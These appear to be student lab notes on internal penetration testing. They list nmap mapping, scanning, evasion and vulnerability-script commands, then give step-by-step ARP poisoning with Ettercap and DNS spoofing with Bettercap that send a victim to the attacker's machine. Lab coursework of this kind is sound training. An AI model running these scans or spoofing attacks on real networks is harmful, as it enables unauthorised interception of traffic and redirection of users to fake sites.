  1-: Internal Penetration Testing
 a) Mapping Commands
1.
nmap -PR -sn <host>
 ARP ping scan to find live hosts.

2.
nmap -PE -sn <host>
 ICMP Echo ping scan.

3.
nmap -PA80 -sn <host>
 TCP ACK ping on port 80.

4.
nmap -O -V <host>
 Detect OS + verbose output.

5.
nmap -sL <host>
 List targets only.

6.
nmap -iL iplist.txt
 Scan multiple IPs from file.

7.
nmap -P22 -iL iplist.txt
 Ping hosts using port 22.

8.
sudo nmap -sA -iL iplist.txt
 ACK scan on IP list.

9.
sudo nmap -sV -iL iplist.txt
 Version scan on IP list.

10.
sudo nmap -O -iL iplist.txt
 OS detection on multiple IPs.

11.
sudo nmap <host> -f
 Fragment packets to evade firewall.

12.
sudo nmap <host> --spoof-mac 0
 Spoof MAC address.

13.
nmap -iL iplist.txt --script vuln
 Run vulnerability scripts on targets.

14.
sudo nmap -sV -p21-8080 --script vulners <host>
 Scan ports + check CVEs using vulners script.

15.
nmap --script vulscan <host>
 Run vulscan NSE script.

16.
nmap --script vulners -sV <host>
 Detect versions + known vulnerabilities.

 b) Scanning Commands
1.
nmap -p- 192.168.1.0/24
 Scan all 65535 ports on subnet.

2.
nmap -sT 192.168.1.0
 TCP connect scan.

3.
nmap -sS 192.168.1.0
 SYN stealth scan.

4.
nmap -sA 192.168.1.0
 ACK scan.

5.
nmap -sV 192.168.1.10
 Service version detection.

6.
nmap -O 192.168.1.10
 Detect operating system.

4-: ARP Poisoning
Aim:

To perform ARP spoofing attack.

Steps (Ettercap):
Open Kali Linux.
Open Ettercap:
ettercap
Scan hosts.
Open host list.
Add victim to Target 1.
Add gateway to Target 2.
Click:

MITM → ARP Poisoning

Select:
Sniff Remote Connections
Click OK.
Result:

Traffic redirected through attacker.

(b): DNS Poisoning
Aim:

To redirect victim to fake website.

Steps:
Open terminal as root:
sudo su
Start Bettercap:
bettercap
Enable probe:
net.probe on
Full duplex spoofing:
set arp.spoof.fullduplex true
Set fake DNS IP:
set dns.spoof.address <Kali_IP>
Set domain:
set dns.spoof.domains example.com
Set victim:
set arp.spoof.targets <Victim_IP>
Start spoofing:
arp.spoof on
dns.spoof on
Result:
Victim redirected to attacker system.
